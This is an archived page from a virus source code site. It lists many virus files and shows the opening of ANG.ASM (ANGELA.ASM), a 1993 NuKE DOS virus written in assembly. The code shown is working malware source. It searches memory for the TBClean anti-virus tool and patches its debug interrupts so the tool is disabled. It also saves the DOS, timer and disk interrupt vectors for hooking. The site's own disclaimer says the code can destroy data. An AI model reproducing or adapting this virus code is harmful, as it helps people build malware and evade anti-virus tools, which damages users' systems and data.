<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: ang_asm</title>
<meta name="KEYWORDS" content="ang.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for ang.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="a86_berylium_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/a86_berylium_asm.php">a86_berylium_asm</a><br>
<a href="a86_dasboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/a86_dasboot_asm.php">a86_dasboot_asm</a><br>
<a href="abraxas5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/abraxas5_asm.php">abraxas5_asm</a><br>
<a href="abraxas__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/abraxas__asm.php">abraxas__asm</a><br>
<a href="abraxasb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/abraxasb_asm.php">abraxasb_asm</a><br>
<a href="ac1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ac1__asm.php">ac1__asm</a><br>
<a href="ac1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ac1_asm.php">ac1_asm</a><br>
<a href="acidtrip_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/acidtrip_asm.php">acidtrip_asm</a><br>
<a href="acme_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/acme_asm.php">acme_asm</a><br>
<a href="actifed_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/actifed_asm.php">actifed_asm</a><br>
<a href="addict1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict1_asm.php">addict1_asm</a><br>
<a href="addict2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict2_asm.php">addict2_asm</a><br>
<a href="addict3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict3_asm.php">addict3_asm</a><br>
<a href="addict4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict4_asm.php">addict4_asm</a><br>
<a href="addict5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict5_asm.php">addict5_asm</a><br>
<a href="addict6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict6_asm.php">addict6_asm</a><br>
<a href="addict7_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict7_asm.php">addict7_asm</a><br>
<a href="addict8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict8_asm.php">addict8_asm</a><br>
<a href="addict9_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict9_asm.php">addict9_asm</a><br>
<a href="adebug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/adebug_asm.php">adebug_asm</a><br>
<a href="afrca109_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/afrca109_asm.php">afrca109_asm</a><br>
<a href="agiplan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/agiplan_asm.php">agiplan_asm</a><br>
<a href="agplan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/agplan_asm.php">agplan_asm</a><br>
<a href="ahadisk_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ahadisk_asm.php">ahadisk_asm</a><br>
<a href="aid_s__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/aid_s__asm.php">aid_s__asm</a><br>
<a href="aid(s)_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/aid(s)_asm.php">aid(s)_asm</a><br>
<a href="aids_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/aids_pas.php">aids_pas</a><br>
<a href="aircop__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/aircop__asm.php">aircop__asm</a><br>
<a href="aircop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/aircop_asm.php">aircop_asm</a><br>
<a href="aircopdr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/aircopdr_asm.php">aircopdr_asm</a><br>
<a href="aircopng_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/aircopng_asm.php">aircopng_asm</a><br>
<a href="ala2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ala2_asm.php">ala2_asm</a><br>
<a href="ala_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ala_asm.php">ala_asm</a><br>
<a href="alameda1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/alameda1_asm.php">alameda1_asm</a><br>
<a href="alameda__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/alameda__asm.php">alameda__asm</a><br>
<a href="alameda_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/alameda_asm.php">alameda_asm</a><br>
<a href="alchemy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/alchemy_asm.php">alchemy_asm</a><br>
<a href="alemeda_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/alemeda_asm.php">alemeda_asm</a><br>
<a href="almeda__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/almeda__asm.php">almeda__asm</a><br>
<a href="almed____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/almed____asm.php">almed____asm</a><br>
<a href="almed_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/almed_asm.php">almed_asm</a><br>
<a href="alter_fa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/alter_fa_asm.php">alter_fa_asm</a><br>
<a href="ambul1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ambul1_asm.php">ambul1_asm</a><br>
<a href="ambul2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ambul2_asm.php">ambul2_asm</a><br>
<a href="ambul3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ambul3_asm.php">ambul3_asm</a><br>
<a href="ambul_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ambul_asm.php">ambul_asm</a><br>
<a href="amf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amf_asm.php">amf_asm</a><br>
<a href="amst_299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst_299_asm.php">amst_299_asm</a><br>
<a href="amst-299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst-299_asm.php">amst-299_asm</a><br>
<a href="amst-345_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst-345_asm.php">amst-345_asm</a><br>
<a href="amst_740_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst_740_asm.php">amst_740_asm</a><br>
<a href="amst-740_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst-740_asm.php">amst-740_asm</a><br>
<a href="amst-740_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst-740_bas.php">amst-740_bas</a><br>
<a href="amst-847_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst-847_asm.php">amst-847_asm</a><br>
<a href="amst-847_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst-847_bas.php">amst-847_bas</a><br>
<a href="amst-852_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst-852_asm.php">amst-852_asm</a><br>
<a href="anath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anath_asm.php">anath_asm</a><br>
<a href="ang_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ang_asm.php">ang_asm</a><br>
<a href="angela_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/angela_asm.php">angela_asm</a><br>
<a href="anna_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anna_asm.php">anna_asm</a><br>
<a href="annoyer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/annoyer_asm.php">annoyer_asm</a><br>
<a href="ant_daf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ant_daf_asm.php">ant_daf_asm</a><br>
<a href="anthrax_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anthrax_asm.php">anthrax_asm</a><br>
<a href="antiblin_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/antiblin_asm.php">antiblin_asm</a><br>
<a href="antiburg_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/antiburg_asm.php">antiburg_asm</a><br>
<a href="anticom2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anticom2_asm.php">anticom2_asm</a><br>
<a href="anticom3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anticom3_asm.php">anticom3_asm</a><br>
<a href="anticom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anticom_asm.php">anticom_asm</a><br>
<a href="anti_da__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anti_da__asm.php">anti_da__asm</a><br>
<a href="anti_daf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anti_daf_asm.php">anti_daf_asm</a><br>
<a href="anti-daf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anti-daf_asm.php">anti-daf_asm</a><br>
<a href="antidaf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/antidaf_asm.php">antidaf_asm</a><br>
<a href="anti-d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anti-d_asm.php">anti-d_asm</a><br>
<a href="anti_mit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anti_mit_asm.php">anti_mit_asm</a><br>
<a href="anti-mit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anti-mit_asm.php">anti-mit_asm</a><br>
<a href="anti_mon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anti_mon_asm.php">anti_mon_asm</a><br>
<a href="antipas_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/antipas_asm.php">antipas_asm</a><br>
<a href="antipode_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/antipode_asm.php">antipode_asm</a><br>
<a href="anti_tel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anti_tel_asm.php">anti_tel_asm</a><br>
<a href="ant_uri_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ant_uri_asm.php">ant_uri_asm</a><br>
<a href="anzuelo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anzuelo_asm.php">anzuelo_asm</a><br>
<a href="ap_400_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap_400_asm.php">ap_400_asm</a><br>
<a href="ap-400__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap-400__asm.php">ap-400__asm</a><br>
<a href="ap-400_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap-400_asm.php">ap-400_asm</a><br>
<a href="ap_440_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap_440_asm.php">ap_440_asm</a><br>
<a href="ap-440_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap-440_asm.php">ap-440_asm</a><br>
<a href="ap_480_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap_480_asm.php">ap_480_asm</a><br>
<a href="ap-480_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap-480_asm.php">ap-480_asm</a><br>
<a href="ap_529_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap_529_asm.php">ap_529_asm</a><br>
<a href="ap-529_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap-529_asm.php">ap-529_asm</a><br>
<a href="ap_605_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap_605_asm.php">ap_605_asm</a><br>
<a href="ap-605_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap-605_asm.php">ap-605_asm</a><br>
<a href="a_pasca__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/a_pasca__asm.php">a_pasca__asm</a><br>
<a href="a_pascal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/a_pascal_asm.php">a_pascal_asm</a><br>
<a href="arbeit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/arbeit_asm.php">arbeit_asm</a><br>
<a href="arcadez_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/arcadez_asm.php">arcadez_asm</a><br>
<a href="archer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/archer_asm.php">archer_asm</a><br>
<a href="arc_hub_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/arc_hub_asm.php">arc_hub_asm</a><br>
<a href="arcvscrl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/arcvscrl_asm.php">arcvscrl_asm</a><br>
<a href="arg100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/arg100_asm.php">arg100_asm</a><br>
<a href="arg110_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/arg110_asm.php">arg110_asm</a><br>
<a href="argent_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/argent_asm.php">argent_asm</a><br>
<a href="aristotl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/aristotl_asm.php">aristotl_asm</a><br>
<a href="armag911_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/armag911_asm.php">armag911_asm</a><br>
<a href="armaged__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/armaged__asm.php">armaged__asm</a><br>
<a href="armagedo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/armagedo_asm.php">armagedo_asm</a><br>
<a href="arpnet_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/arpnet_pas.php">arpnet_pas</a><br>
<a href="art_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/art_asm.php">art_asm</a><br>
<a href="asex_099_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/asex_099_asm.php">asex_099_asm</a><br>
<a href="asex-099_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/asex-099_asm.php">asex-099_asm</a><br>
<a href="asex_100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/asex_100_asm.php">asex_100_asm</a><br>
<a href="asex-100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/asex-100_asm.php">asex-100_asm</a><br>
<a href="asexual_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/asexual_asm.php">asexual_asm</a><br>
<a href="ash-449_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ash-449_asm.php">ash-449_asm</a><br>
<a href="ash_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ash_asm.php">ash_asm</a><br>
<a href="asp_472_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/asp_472_asm.php">asp_472_asm</a><br>
<a href="asp-472_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/asp-472_asm.php">asp-472_asm</a><br>
<a href="at_144_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/at_144_asm.php">at_144_asm</a><br>
<a href="at-144_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/at-144_asm.php">at-144_asm</a><br>
<a href="at_149_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/at_149_asm.php">at_149_asm</a><br>
<a href="at-149_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/at-149_asm.php">at-149_asm</a><br>
<a href="atomic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/atomic_asm.php">atomic_asm</a><br>
<a href="attach_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/attach_pas.php">attach_pas</a><br>
<a href="attit548_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/attit548_asm.php">attit548_asm</a><br>
<a href="avenge_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/avenge_asm.php">avenge_asm</a><br>
<a href="avenger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/avenger_asm.php">avenger_asm</a><br>
<a href="avengsrc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/avengsrc_asm.php">avengsrc_asm</a><br>
<a href="azeuss_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/azeuss_asm.php">azeuss_asm</a><br>
<a href="azusa__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/azusa__asm.php">azusa__asm</a><br>
<a href="azusa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/azusa_asm.php">azusa_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/1/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/1/index.php'" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/b/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/b/index.php'" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/c/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/c/index.php'" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/d/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/d/index.php'" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/e/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/e/index.php'" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/f/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/f/index.php'" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/g/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/g/index.php'" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/h/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/h/index.php'" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/i/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/i/index.php'" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/j/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/j/index.php'" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/k/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/k/index.php'" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/l/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/l/index.php'" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/m/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/m/index.php'" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/n/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/n/index.php'" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/o/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/o/index.php'" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/p/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/p/index.php'" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/q/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/q/index.php'" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/r/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/r/index.php'" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/s/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/s/index.php'" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/t/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/t/index.php'" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/u/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/u/index.php'" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/v/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/v/index.php'" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/w/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/w/index.php'" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/x/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/x/index.php'" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/y/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/y/index.php'" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;===============================================================================
;
;       (c) 1993 by NuKE Computer Security Publications, Inc.
;           Developed by Rock Steady of NuKE Inc.
;
;       <ANGELA.ASM>
;
virus_size      equ     last - init_virus               ;virus size (bytes)

seg_a           segment byte public
                assume  cs:seg_a,ds:seg_a

                org     100h                            ;compile to .com

start:          jmp     init_virus

;-------------------------------------------------------------------------------
init_virus:     call    doit_now                        ;begin virus

doit_now:       pop     bp                              ;pop call offset
                sub     bp,offset doit_now              ;fix it with pointer

                push    ax
                push    bx                              ;save the registers
                push    cx
                push    dx
                push    si
                push    ds


                mov     byte ptr cs:[tb_here][bp],00h
                xor     dx,dx                           ;dx=0
                mov     ds,dx                           ;ds=0
                mov     ax,word ptr ds:[0006h]          ;ax=0000:0006 segment of
                                                        ; int 1h
                mov     ds,ax                           ;ds=segment of int 1
                mov     cx,0FFFFh                       ;cx=64k
                mov     si,dx                           ;si=0

look_4_tbclean: cmp     word ptr ds:[si],0A5F3h         ;look TBClean in memory
                je      check_it                        ;jmp if its TBClean
look_again:     inc     si                              ;if not continue looking
                loop    look_4_tbclean
                jmp     not_found                       ;not found cont normal

check_it:       cmp     word ptr ds:[si+2],0C7FAh       ;check TBClean string
                jne     look_again                      ;jmp =! tbclean
                cmp     word ptr ds:[si+4],0006h        ;check TBClean string
                jne     look_again                      ;jmp =! tbclean
                cmp     word ptr ds:[si+10],020Eh       ;check TBClean string
                jne     look_again                      ;jmp =! tbclean
                cmp     word ptr ds:[si+12],0C700h      ;check TBClean string
                jne     look_again                      ;jmp =! tbclean
                cmp     word ptr ds:[si+14],0406h       ;check TBClean string
                jne     look_again                      ;jmp =! tbclean

                mov     bx,word ptr ds:[si+17]          ;steal REAL int 1 offset
                mov     byte ptr ds:[bx],0CFh           ;replace with IRET

                mov     bx,word ptr ds:[si+27]          ;steal REAL int 3 offset
                mov     byte ptr ds:[bx],0CFh           ;replece with IRET

                mov     byte ptr cs:[tb_here][bp],01h   ;set the TB flag on

                mov     bx,word ptr ds:[si+51h]         ;get 2nd segment of ints
                mov     word ptr cs:[tb_int2][bp],bx    ;vector table

                mov     bx,word ptr ds:[si-5]           ;get offset of 1st copy
                mov     word ptr cs:[tb_ints][bp],bx    ;of vector table

not_found:      xor     dx,dx
                push    ds
                mov     ds,dx                           ;put that in ds
                les     si,dword ptr ds:[0084h]         ;get int21 vector
                mov     word ptr cs:[int21][bp],si      ;save int21 offset
                mov     word ptr cs:[int21+2][bp],es    ;save int21 segment

                les     si,dword ptr ds:[0070h]         ;get int1c vector
                mov     word ptr cs:[int1c][bp],si      ;save int1c offset
                mov     word ptr cs:[int1c+2][bp],es    ;save int1c segment

                les     si,dword ptr ds:[004ch]         ;get int13 vector
                mov     word ptr cs:[int13][bp],si      ;save int13 offset
                mov     word ptr cs:[int13+2][bp],es    ;save int13 segment
                pop     ds

                mov     byte ptr cs:[mcb][bp],00h       ;reset the TB mcb flag
                mov     ax,0abcdh                       ;test if virus is here?
